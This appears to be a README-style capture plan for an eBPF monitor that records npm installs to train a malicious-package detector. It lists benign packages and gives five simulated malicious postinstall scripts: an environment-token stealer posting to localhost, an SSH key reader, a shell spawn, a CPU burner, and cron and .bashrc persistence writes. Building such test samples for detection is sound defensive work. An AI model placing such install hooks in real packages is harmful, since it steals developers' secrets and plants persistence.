# Package Capture List for Aniruddha

This list contains packages to capture with the eBPF monitor for better ML training data.

> **Superseded for corpus building.** Use
> [`scripts/capture/`](../../scripts/capture/README.md) instead. It captures each
> package in a fresh container, which gives clean per-sample state, and it is
> the only supported path for malicious samples. This file is kept for the
> package-selection rationale below.

## Instructions

**The monitor does not take an install command as an argument.** There is no
`--package` flag; `sudo ./npm-ebpf-monitor npm install <pkg>` does not work and
never did. Detection is passive: the monitor watches the kernel for `npm
install` exec events from any process, so it has to be running *before* and
*alongside* the install, in a separate shell.

Terminal 1 — start the monitor and leave it running:

```bash
sudo ./npm-ebpf-monitor -output-dir ./sessions
```

Terminal 2 — install packages as your normal user:

```bash
mkdir -p /tmp/capture && cd /tmp/capture && npm init -y
npm install <package-name>
sleep 20    # let the session's events drain before starting the next one
```

Stop the monitor with Ctrl-C when the batch is done.

The JSON session files are written to the `-output-dir` directory, named
`<session-id>_<package-name>.json`.

Useful flags: `-session-timeout` (default 120s before a session is forcibly
completed), `-verbose`, and `-dry-run` to check the BPF probes load without
capturing anything.

---

## BENIGN PACKAGES (Capture 1-2 sessions each)

These are safe, popular npm packages. They should NOT trigger malicious behavior.

### Utility Libraries
| Package | Why Include |
|---------|-------------|
| `lodash` | Already have (baseline) |
| `underscore` | Similar to lodash, utility functions |
| `ramda` | Functional programming utility |
| `moment` | Date/time manipulation |
| `dayjs` | Lightweight date library |

### String/Text Processing
| Package | Why Include |
|---------|-------------|
| `chalk` | Terminal string styling |
| `validator` | String validation |
| `uuid` | UUID generation |
| `nanoid` | Tiny ID generator |

### HTTP/Network (benign)
| Package | Why Include |
|---------|-------------|
| `axios` | HTTP client (benign network activity) |
| `node-fetch` | Fetch API for Node |
| `got` | HTTP request library |

### File System (benign)
| Package | Why Include |
|---------|-------------|
| `fs-extra` | File system utilities |
| `glob` | File pattern matching |
| `rimraf` | Directory removal |

### Development Tools
| Package | Why Include |
|---------|-------------|
| `debug` | Debug logging |
| `dotenv` | Environment variable loader |
| `yargs` | Command line argument parser |

---

## MALICIOUS TEST PACKAGES (We create these)

These are our custom test packages that simulate real attack behaviors.

### Already Created
- [x] `suspicious-test` - Reads env vars, makes network connections
- [x] `benign-test` - Simple postinstall, no suspicious activity

### Need to Create

#### 1. `env-stealer-test` (Data Exfiltration)
Behavior: Reads sensitive environment variables and "sends" them
```javascript
// postinstall.js
const http = require('http');
const sensitiveVars = ['AWS_SECRET', 'GITHUB_TOKEN', 'NPM_TOKEN', 'DATABASE_URL'];
const stolen = {};
sensitiveVars.forEach(v => { if(process.env[v]) stolen[v] = process.env[v]; });
// Simulated exfiltration (to localhost for safety)
const req = http.request({hostname:'127.0.0.1', port:9999, method:'POST'});
req.write(JSON.stringify(stolen));
req.end();
```

#### 2. `ssh-reader-test` (Credential Theft)
Behavior: Attempts to read SSH keys
```javascript
// postinstall.js
const fs = require('fs');
const path = require('path');
const sshDir = path.join(require('os').homedir(), '.ssh');
try {
  const files = fs.readdirSync(sshDir);
  files.forEach(f => {
    try { fs.readFileSync(path.join(sshDir, f)); } catch(e) {}
  });
} catch(e) {}
```

#### 3. `reverse-shell-test` (Command Execution)
Behavior: Spawns a shell process
```javascript
// postinstall.js
const { spawn } = require('child_process');
// Attempt to spawn shell (will be detected by process tracer)
const sh = spawn('sh', ['-c', 'echo "shell spawned"']);
sh.on('close', () => {});
```

#### 4. `crypto-miner-test` (Resource Abuse)
Behavior: High CPU usage patterns
```javascript
// postinstall.js
// Simulate mining behavior (heavy computation)
let x = 0;
for(let i = 0; i < 10000000; i++) { x += Math.random(); }
console.log('Computation complete');
```

#### 5. `persistence-test` (System Modification)
Behavior: Attempts to write to startup locations
```javascript
// postinstall.js
const fs = require('fs');
const os = require('os');
// Attempt to write to cron (will fail but syscall will be logged)
try { fs.writeFileSync('/etc/cron.d/test', ''); } catch(e) {}
// Attempt to write to bashrc
try { fs.appendFileSync(os.homedir() + '/.bashrc', '# test'); } catch(e) {}
```

---

## SUMMARY

After capturing, we should have:

| Category | Count | Packages |
|----------|-------|----------|
| Benign utilities | ~15 | lodash, underscore, moment, chalk, etc. |
| Benign network | ~3 | axios, node-fetch, got |
| Benign file ops | ~3 | fs-extra, glob, rimraf |
| Malicious (our tests) | 5-6 | suspicious-test, env-stealer, ssh-reader, etc. |

**Target: 20-25 total sessions with 5-6 malicious samples**

---

## Quick Capture Commands

Preferred — the container harness handles the monitor lifecycle, settling and
labelling for you:

```bash
sudo bash scripts/capture/capture.sh --package underscore --label 0 --out captures/benign
sudo bash scripts/capture/capture.sh \
  --list scripts/capture/packages-benign.txt --label 0 --out captures/benign
```

Manual, two-terminal equivalent. Terminal 1:

```bash
sudo ./npm-ebpf-monitor -output-dir ./sessions
```

Terminal 2:

```bash
mkdir -p /tmp/capture && cd /tmp/capture && npm init -y

for pkg in underscore moment chalk axios uuid dotenv; do
  npm install "$pkg"
  sleep 20
done
```

For the local test packages, pack them first and install the tarball by its
bare filename. `npm install ./tests/packages/ssh-reader-test/` records the whole
path as the package name, and the writer then has to sanitise the slashes out
of the filename, which makes the session awkward to trace back to its source:

```bash
cd /tmp/capture
npm pack /path/to/repo/tests/packages/ssh-reader-test   # -> ssh-reader-test-1.0.0.tgz
npm install ./ssh-reader-test-1.0.0.tgz
sleep 20
```
